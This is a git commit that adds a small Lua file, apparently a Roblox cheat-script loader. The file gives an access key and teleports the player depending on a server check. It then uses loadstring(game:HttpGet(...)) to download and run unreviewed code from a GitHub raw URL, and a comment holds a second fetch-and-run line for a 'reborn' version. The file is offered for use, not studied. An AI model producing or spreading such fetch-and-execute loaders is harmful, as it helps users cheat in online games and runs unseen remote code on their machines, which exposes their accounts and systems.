c1674c6d1614a22c641d01de0654b7cf3716936c
randomstring0 <sandshowcase@gmail.com>
2025-01-12 18:29:26 +0700

    Create qwerty

---
+++ qwerty29.lua
@@ -0,0 +1,8 @@
+--Key is : Syntaxbesthub
+if not game:GetService("ReplicatedStorage"):FindFirstChild("01_server") then return game:GetService("TeleportService"):Teleport(17574618959, game:GetService("Players").LocalPlayer) end
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Vallater/SyntaxV2/b7a88a7b84174e3c2220c7a8ca477e40699ddd2c/Syntaxontop'),true))()
+
+--[[
+i'm not the owner of this script
+reborn version : loadstring(game:HttpGet(('https://raw.githubusercontent.com/Memeboiyot/SyntaxRebornOfficial/main/SyntaxReborn'),true))()
+]]
